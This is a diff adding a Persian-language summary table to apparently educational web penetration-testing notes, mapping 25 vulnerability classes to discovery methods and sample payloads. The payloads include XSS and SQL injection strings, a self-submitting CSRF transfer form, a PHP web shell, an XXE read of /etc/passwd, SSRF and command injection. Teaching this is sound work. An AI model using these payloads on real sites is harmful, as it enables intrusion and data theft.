@@ -584,3 +584,33 @@ GET /invoice?id=101
 
 ---
 
+| فصل | نوع آسیب‌پذیری | روش کشف | پیلود نمونه | مثال عملی |
+|-----|----------------|----------|-------------|------------|
+| 1 | مبانی وب | بررسی ترافیک HTTP/HTTPS | - | مشاهده درخواست ورود و پاسخ سرور |
+| 2 | اطلاعات سرور و دامنه | Subdomain enumeration، Banner grabbing | - | `curl -I http://example.com` → `Server: Apache/2.4.49` |
+| 3 | نقشه‌برداری اپلیکیشن | Crawling با Burp Spider یا gobuster | - | `gobuster dir -u http://example.com -w common.txt` → `/admin` |
+| 4 | Input Validation (XSS, SQLi) | تزریق پارامتر GET/POST | `<script>alert('XSS')</script>` | `http://example.com/search?q=<script>alert('XSS')</script>` |
+| 5 | Broken Authentication | Brute force، Credential stuffing | `admin:admin123` | ورود غیرمجاز با Burp Intruder |
+| 6 | Session Management | بررسی طول و الگوی Session ID | تغییر کاراکتر Session ID | `PHPSESSID=abcd1235` → اگر هنوز کار می‌کند، آسیب‌پذیر است |
+| 7 | Access Control (IDOR) | تغییر شناسه کاربر در URL/POST | `GET /profile?user_id=123` | تغییر به `user_id=124` → نمایش اطلاعات کاربر دیگر |
+| 8 | SQL Injection | تزریق `'` و بررسی خطای SQL | `' OR '1'='1` | `http://example.com/login?user=' OR '1'='1&pass=anything` → ورود موفق |
+| 9 | XSS Stored/Reflected/DOM | ثبت داده حاوی script | `<script>alert(1)</script>` | ارسال کامنت → نمایش اسکریپت در صفحه |
+| 10 | CSRF | ایجاد فرم HTML بدون توکن | `<form action="http://example.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"><input type="hidden" name="to" value="attacker"></form><script>document.forms[0].submit()</script>` | اگر انتقال موفق باشد، آسیب‌پذیر است |
+| 11 | File Handling (Upload, LFI/RFI) | آپلود فایل مخرب | `<?php system($_GET['cmd']); ?>` | آپلود `shell.php` → `http://example.com/uploads/shell.php?cmd=ls` |
+| 12 | Advanced SQLi | Blind/Time-based SQLi | `' OR IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0) --` | پاسخ با ۵ ثانیه تاخیر → آسیب‌پذیر |
+| 13 | XXE | تزریق ENTITY خارجی در XML | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | پاسخ سرور حاوی `/etc/passwd` |
+| 14 | SSRF | تغییر URL در پارامتر | `http://example.com/fetch?url=http://127.0.0.1/admin` | اگر محتوا بازگشت → آسیب‌پذیر است |
+| 15 | Command Injection | تزریق دستورات خط فرمان | `; ls -la` | `http://example.com/ping?host=127.0.0.1; ls -la` → لیست فایل‌ها برگشت |
+| 16 | IDOR | تغییر پارامتر GET/POST | `GET /invoice?id=101` | تغییر به `id=102` → مشاهده فاکتور دیگر کاربر |
+| 17 | XSSI | دسترسی به داده‌های JS | `</script><script>alert(1)</script>` | اطلاعات محرمانه از فایل JS خارج شد |
+| 18 | Web Services Vulnerabilities | تست endpoint API با Postman | `GET /api/users/1` بدون توکن | اطلاعات کاربر بازگشت |
+| 19 | API Auth Flaws (JWT/OAuth) | تغییر payload JWT | `{"user":"admin"}` | جایگزینی JWT → دسترسی admin بدون رمز عبور |
+| 20 | Application Logic Flaws | تغییر تراکنش‌ها | `quantity=1 → quantity=100` | قیمت کاهش نیافت → Logic flaw |
+| 21 | Security Misconfiguration | دسترسی مستقیم مسیرها | `http://example.com/uploads/` | مشاهده لیست فایل‌ها → آسیب‌پذیر است |
+| 22 | Sensitive Data Exposure | مانیتور ترافیک HTTP | - | درخواست POST حاوی `password=1234` در HTTP |
+| 23 | Using Vulnerable Components | بررسی نسخه‌ها | - | `Server: Apache-Coyote/1.1` → Exploit موجود |
+| 24 | Insufficient Logging & Monitoring | بررسی لاگ سرور | - | دسترسی غیرمجاز بدون هیچ log |
+| 25 | Web Application Security Testing | همه موارد بالا | ترکیبی از XSS, SQLi, CSRF, IDOR | اجرای اسکن جامع → گزارش HTML/PDF |
+
+---
+
